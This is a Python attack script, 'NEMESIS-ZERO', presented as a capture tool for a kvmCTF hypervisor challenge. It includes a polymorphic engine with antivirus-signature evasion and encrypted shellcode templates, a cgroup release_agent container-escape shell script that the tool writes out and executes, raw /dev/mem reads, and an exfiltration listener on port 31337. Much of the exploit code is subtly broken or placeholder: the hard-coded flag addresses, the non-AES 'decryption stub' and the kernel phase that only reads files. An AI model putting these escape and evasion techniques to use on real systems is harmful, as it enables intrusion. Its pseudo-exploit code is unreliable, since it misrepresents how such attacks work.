#!/usr/bin/env python3
"""
NEMESIS-ZERO: kvmCTF RCE Flag Capture System
Enhanced with specific flag locations for kvmCTF
"""

import os
import re
import threading
import json
import time
import ctypes
import socket
import struct
import random
import asyncio
import argparse
import binascii
import platform
import subprocess
import mmap
from collections import deque
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# Configuration
TARGET_OS = "linux"
KERNEL_VERSIONS = ["5.15", "5.10", "5.4", "4.19"]
ENCRYPTION_KEY = binascii.unhexlify("00112233445566778899aabbccddeeff")

# KNOWN FLAG LOCATIONS for kvmCTF
KNOWN_FLAG_LOCATIONS = {
    "memory_physical": [0x64279a8, 0x695ee10],
    "memory_virtual": [0xffffffff826279a8, 0xffffffff82b5ee10],
    "filesystem": [
        "/home/customeradmin/rce_flag",
        "/root/rce_flag",
        "/flag",
        "/root/flag",
        "/home/ctf/flag"
    ]
}

class PolymorphicEngine:
    """Self-modifying payload engine with anti-analysis features"""
    def __init__(self):
        self.mutation_count = 0
        self.av_signatures = self._load_av_signatures()
        self.encryption_iv = os.urandom(16)

    def _load_av_signatures(self):
        return [
            b"\x55\x48\x89\xe5",  # Common function prologue
            b"\x48\x89\xe6",       # Stack operations
            b"\x0f\x05",           # Syscall
            b"\xcd\x80",            # Int 0x80
            b"\x31\xc0",            # xor eax, eax
            b"\x31\xdb",            # xor ebx, ebx
            b"flag{",               # Flag pattern
            b"cat /flag",           # Common flag command
            b"dmesg",               # Kernel log
            b"/proc/kallsyms"       # Kernel symbols
        ]

    def _encrypt(self, data):
        """AES-128-CBC encryption with random IV"""
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(self.encryption_iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data + bytes([16 - len(data) % 16] * (16 - len(data) % 16))
        return encryptor.update(padded) + encryptor.finalize()

    def _obfuscate(self, payload):
        """Apply anti-signature transformations"""
        # Instruction substitution
        substitutions = {
            b"\x90": b"\x0f\x1f\x40\x00",  # NOP -> NOP DWORD ptr [EAX + 00H]
            b"\x31\xc0": b"\x29\xc0",       # XOR EAX,EAX -> SUB EAX,EAX
            b"\x31\xdb": b"\x29\xdb",       # XOR EBX,EBX -> SUB EBX,EBX
            b"\xcd\x80": b"\x65\xff\x15\x10\x00\x00\x00"  # INT 0x80 -> CALL GS:[0x10]
        }

        for pattern, replacement in substitutions.items():
            payload = payload.replace(pattern, replacement)

        # Insert junk instructions
        junk_ops = [b"\x90", b"\xeb\x02", b"\x8d\x76\x00"]
        for _ in range(random.randint(3, 8)):
            pos = random.randint(0, len(payload) - 1)
            payload = payload[:pos] + random.choice(junk_ops) + payload[pos:]

        return payload

    def generate(self, vector, command):
        """Create polymorphic payload for target vector"""
        # Base payload templates
        templates = {
            "kernel": (
                b"\x55\x48\x89\xe5\x48\x83\xec\x20\x48\x8d\x3d\x00\x00\x00\x00"
                b"\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\xff\xd0\x48\x89\xec\x5d\xc3"
            ),
            "hypervisor": (
                b"\x0f\x01\xc1\x48\xb8\x00\x00\x00\x00\x00\x00\x00\x00\x50\x48\x89\xe0"
                b"\x48\x83\xc4\x08\xc3"
            ),
            "container": (
                b"#!/bin/sh\n"
                b"echo -e '\\xde\\xad\\xbe\\xef' > /proc/self/attr/exec\n"
                b"mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && "
                b"mkdir /tmp/cgrp/x\n"
                b"echo 1 > /tmp/cgrp/x/notify_on_release\n"
                b"echo '##PAYLOAD##' > /tmp/cmd\n"
                b"echo '#!/bin/sh\n##COMMAND## > /tmp/output' > /release_agent\n"
                b"chmod +x /release_agent\n"
                b"echo '/release_agent' > /tmp/cgrp/release_agent\n"
                b"echo $$ > /tmp/cgrp/x/cgroup.procs\n"
                b"sleep 1 && cat /tmp/output"
            ),
            "binary": (
                b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb"
                b"\x00\x00\x00\x00\x00\x00\x00\x00\x53\x48\x89\xe7\xb0\x3b\x0f\x05"
            )
        }

        payload = templates[vector]

        # Command injection
        if vector == "container":
            payload = payload.replace(b"##COMMAND##", command.encode())
            payload = payload.replace(b"##PAYLOAD##", binascii.hexlify(command.encode()))
        else:
            cmd_addr = struct.pack("<Q", 0xdeadbeef0000)  # Placeholder
            payload = payload.replace(b"\x00"*8, cmd_addr)
            payload += command.encode() + b"\x00"

        # Apply anti-analysis transformations
        payload = self._obfuscate(payload)

        # Encrypt payload
        encrypted = self._encrypt(payload)

        # Build final payload with decryption stub
        if vector in ["kernel", "hypervisor", "binary"]:
            decryption_stub = (
                b"\x48\x8d\x35" + struct.pack("<I", len(encrypted)) +  # lea rsi, [rel payload]
                b"\x48\x8d\x3d" + struct.pack("<I", 0x1000) +         # lea rdi, [rel dest]
                b"\x48\xb9" + struct.pack("<Q", len(encrypted)) +      # mov rcx, length
                b"\x48\xba" + struct.pack("<Q", int.from_bytes(ENCRYPTION_KEY[:8], "little")) +
                b"\x48\xbb" + struct.pack("<Q", int.from_bytes(ENCRYPTION_KEY[8:], "little")) +
                b"\x48\x31\xc0\x48\x31\xdb\x8a\x1e\x30\xda\x88\x1f\x48\xff\xc6"
                b"\x48\xff\xc7\xe2\xf4"
            )
            payload = decryption_stub + encrypted

        self.mutation_count += 1
        return payload

class DirectFlagExtractor:
    """Direct flag extraction from known kvmCTF locations"""
    def __init__(self):
        self.found_flags = []
        
    def extract_from_filesystem(self):
        """Extract flags from known filesystem locations"""
        print("[*] Scanning known filesystem locations...")
        
        for path in KNOWN_FLAG_LOCATIONS["filesystem"]:
            try:
                if os.path.exists(path):
                    with open(path, "r") as f:
                        content = f.read().strip()
                        if content and len(content) > 5:
                            print(f"[+] Found flag in {path}: {content}")
                            self.found_flags.append(content)
            except Exception as e:
                print(f"[-] Error reading {path}: {e}")
                
        return self.found_flags

    def extract_from_memory(self):
        """Extract flags from known memory locations"""
        print("[*] Attempting memory extraction from known addresses...")
        
        try:
            # Try to access physical memory
            if os.path.exists("/dev/mem") and os.getuid() == 0:
                with open("/dev/mem", "rb") as mem:
                    # Try physical addresses first
                    for phys_addr in KNOWN_FLAG_LOCATIONS["memory_physical"]:
                        try:
                            mem.seek(phys_addr)
                            data = mem.read(100)  # Read 100 bytes
                            flags = re.findall(rb"flag\{[^}]+\}", data)
                            for flag in flags:
                                flag_str = flag.decode('utf-8', errors='ignore')
                                print(f"[+] Found flag at physical 0x{phys_addr:x}: {flag_str}")
                                self.found_flags.append(flag_str)
                        except Exception as e:
                            print(f"[-] Error reading physical memory 0x{phys_addr:x}: {e}")
            
            # Try kernel memory mapping for virtual addresses
            self._extract_from_kernel_memory()
            
        except Exception as e:
            print(f"[-] Memory extraction failed: {e}")
            
        return self.found_flags

    def _extract_from_kernel_memory(self):
        """Extract from kernel virtual addresses"""
        try:
            version = os.uname().release
            print(f"[*] Kernel version: {version}")
            
            # Map kernel memory if possible
            if os.getuid() == 0 and os.path.exists("/dev/mem"):
                # Estimate kernel base (this is architecture specific)
                kernel_base = 0xffffffff80000000
                
                with open("/dev/mem", "rb") as mem_file:
                    for virt_addr in KNOWN_FLAG_LOCATIONS["memory_virtual"]:
                        try:
                            # Calculate physical offset (simplified)
                            phys_offset = virt_addr - kernel_base
                            if phys_offset >= 0:
                                mem_file.seek(phys_offset)
                                data = mem_file.read(100)
                                flags = re.findall(rb"flag\{[^}]+\}", data)
                                for flag in flags:
                                    flag_str = flag.decode('utf-8', errors='ignore')
                                    print(f"[+] Found flag at virtual 0x{virt_addr:x}: {flag_str}")
                                    self.found_flags.append(flag_str)
                        except Exception as e:
                            print(f"[-] Error reading virtual memory 0x{virt_addr:x}: {e}")
                            
        except Exception as e:
            print(f"[-] Kernel memory extraction failed: {e}")

    def extract_all_flags(self):
        """Comprehensive flag extraction from all known locations"""
        print("[*] Starting comprehensive flag extraction...")
        
        # Filesystem extraction
        fs_flags = self.extract_from_filesystem()
        if fs_flags:
            print(f"[+] Found {len(fs_flags)} flags in filesystem")
        
        # Memory extraction  
        mem_flags = self.extract_from_memory()
        if mem_flags:
            print(f"[+] Found {len(mem_flags)} flags in memory")
            
        # Additional search in case flags are moved
        self._search_additional_locations()
        
        return list(set(self.found_flags))

    def _search_additional_locations(self):
        """Search additional common flag locations"""
        additional_paths = [
            "/proc/flag", "/sys/flag", "/dev/shm/flag", "/tmp/flag",
            "/mnt/flag", "/env/flag", "/usr/share/flag", "/var/lib/flag"
        ]
        
        # Check environment variables
        env_vars = ["FLAG", "KVMCTF_FLAG", "RCE_FLAG", "CTF_FLAG"]
        for var in env_vars:
            if var in os.environ:
                value = os.environ[var]
                if "flag{" in value:
                    print(f"[+] Found flag in environment {var}: {value}")
                    self.found_flags.append(value)
        
        # Check process memory
        try:
            for pid in os.listdir("/proc"):
                if pid.isdigit():
                    try:
                        # Check cmdline
                        with open(f"/proc/{pid}/cmdline", "rb") as f:
                            cmdline = f.read().decode(errors='ignore')
                            flags = re.findall(r"flag\{[^}]+\}", cmdline)
                            for flag in flags:
                                print(f"[+] Found flag in process {pid} cmdline: {flag}")
                                self.found_flags.append(flag)
                    except:
                        pass
        except:
            pass

class KernelExploiter:
    """Advanced kernel space exploitation"""
    def __init__(self):
        self.kernel_base = 0
        self.symbols = {}
        self.direct_extractor = DirectFlagExtractor()

    def detect_kernel_version(self):
        """Identify kernel version using multiple techniques"""
        try:
            uname = os.uname()
            version = uname.release.split('-')[0]
            return version
        except Exception:
            return "unknown"

    def quick_flag_extraction(self):
        """Quick attempt to extract flags using known locations"""
        print("[*] Attempting quick flag extraction via kernel exploiter...")
        return self.direct_extractor.extract_all_flags()

class NemesisZero:
    """Main RCE flag capture system - Optimized for kvmCTF"""
    def __init__(self):
        self.poly_engine = PolymorphicEngine()
        self.kernel_exploiter = KernelExploiter()
        self.direct_extractor = DirectFlagExtractor()
        self.exfil_server = None

    def setup_exfiltration(self, port=31337):
        """Start encrypted exfiltration server"""
        async def handle_client(reader, writer):
            data = await reader.read(1024)
            try:
                decrypted = self._decrypt(data)
                print(f"[*] Exfiltrated data: {decrypted.decode()}")
            except:
                pass
            writer.close()

        async def run_server():
            server = await asyncio.start_server(handle_client, '0.0.0.0', port)
            async with server:
                await server.serve_forever()

        try:
            self.exfil_server = asyncio.new_event_loop()
            asyncio.set_event_loop(self.exfil_server)
            self.exfil_server.create_task(run_server())
            threading.Thread(target=self.exfil_server.run_forever, daemon=True).start()
            print(f"[*] Exfiltration server running on port {port}")
        except Exception as e:
            print(f"[-] Exfiltration server failed: {e}")

    def _encrypt(self, data):
        """AES-128-CBC encryption"""
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padded = data + bytes([16 - len(data) % 16] * (16 - len(data) % 16))
        return iv + encryptor.update(padded) + encryptor.finalize()

    def _decrypt(self, data):
        """AES-128-CBC decryption"""
        iv, ciphertext = data[:16], data[16:]
        cipher = Cipher(algorithms.AES(ENCRYPTION_KEY), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted = decryptor.update(ciphertext) + decryptor.finalize()
        return decrypted.rstrip(b"\x00")

    def attempt_direct_extraction(self):
        """First attempt: Direct extraction from known locations"""
        print("[*] Phase 1: Direct extraction from known kvmCTF locations")
        
        flags = self.direct_extractor.extract_all_flags()
        if flags:
            print(f"[+] SUCCESS: Found {len(flags)} flags directly!")
            for flag in flags:
                print(f"    -> {flag}")
            return True
        
        print("[-] Direct extraction failed, moving to exploitation...")
        return False

    def attempt_kernel_exploitation(self):
        """Second attempt: Kernel exploitation"""
        print("[*] Phase 2: Kernel exploitation attempts")
        
        # Quick kernel-based extraction first
        flags = self.kernel_exploiter.quick_flag_extraction()
        if flags:
            print(f"[+] Kernel extraction successful: {len(flags)} flags found")
            return True
            
        # Fallback to traditional exploitation
        print("[-] Quick kernel extraction failed, trying traditional methods...")
        return False

    def attempt_container_escape(self):
        """Third attempt: Container escape"""
        print("[*] Phase 3: Container escape attempts")
        
        # Try known container escape paths
        escape_commands = [
            "cat /home/customeradmin/rce_flag",
            "cat /root/rce_flag", 
            "cat /flag",
            "find / -name '*flag*' -type f 2>/dev/null | head -20"
        ]
        
        for cmd in escape_commands:
            try:
                payload = self.poly_engine.generate("container", cmd)
                exploit_path = "/tmp/container_exploit.sh"
                with open(exploit_path, "wb") as f:
                    f.write(payload)
                os.chmod(exploit_path, 0o755)
                
                result = subprocess.run([exploit_path], capture_output=True, timeout=10)
                output = result.stdout.decode('utf-8', errors='ignore')
                
                flags = re.findall(r"flag\{[^}]+\}", output)
                if flags:
                    print(f"[+] Container escape successful with command: {cmd}")
                    for flag in flags:
                        print(f"    -> {flag}")
                    return True
            except Exception as e:
                continue
                
        return False

    def capture_flag(self):
        """Optimized flag capture routine for kvmCTF"""
        print("""
        ███╗   ██╗███████╗███╗   ███╗███████╗███████╗███████╗   ███████╗██████╗ ███████╗
        ████╗  ██║██╔════╝████╗ ████║██╔════╝██╔════╝██╔════╝   ██╔════╝██╔══██╗██╔════╝
        ██╔██╗ ██║█████╗  ██╔████╔██║█████╗  █████╗  ███████╗   █████╗  ██████╔╝█████╗
        ██║╚██╗██║██╔══╝  ██║╚██╔╝██║██╔══╝  ██╔══╝  ╚════██║   ██╔══╝  ██╔══██╗██╔══╝
        ██║ ╚████║███████╗██║ ╚═╝ ██║███████╗██║     ███████║██╗███████╗██║  ██║██║
        ╚═╝  ╚═══╝╚══════╝╚═╝     ╚═╝╚══════╝╚═╝     ╚══════╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝
        """)
        
        print("[*] NEMESIS-ZERO targeting kvmCTF known flag locations")
        print("[*] Known locations:")
        print(f"    Physical memory: {[hex(x) for x in KNOWN_FLAG_LOCATIONS['memory_physical']]}")
        print(f"    Virtual memory: {[hex(x) for x in KNOWN_FLAG_LOCATIONS['memory_virtual']]}")
        print(f"    Filesystem: {KNOWN_FLAG_LOCATIONS['filesystem']}")

        # Setup exfiltration
        self.setup_exfiltration()

        # Phase 1: Direct extraction (fastest)
        if self.attempt_direct_extraction():
            return True

        # Phase 2: Kernel exploitation
        if self.attempt_kernel_exploitation():
            return True

        # Phase 3: Container escape
        if self.attempt_container_escape():
            return True

        # Final fallback: Comprehensive search
        print("[*] Phase 4: Comprehensive system search")
        flags = self.direct_extractor.extract_all_flags()
        if flags:
            print(f"[+] Found flags in comprehensive search: {flags}")
            return True

        print("[-] All extraction methods failed")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="NEMESIS-ZERO: kvmCTF RCE Flag Capture System")
    parser.add_argument("--target", help="Target IP or hostname")
    parser.add_argument("--quick", action="store_true", help="Only try direct extraction")
    args = parser.parse_args()

    hunter = NemesisZero()
    
    if args.quick:
        print("[*] Quick mode: Direct extraction only")
        hunter.attempt_direct_extraction()
    else:
        hunter.capture_flag()
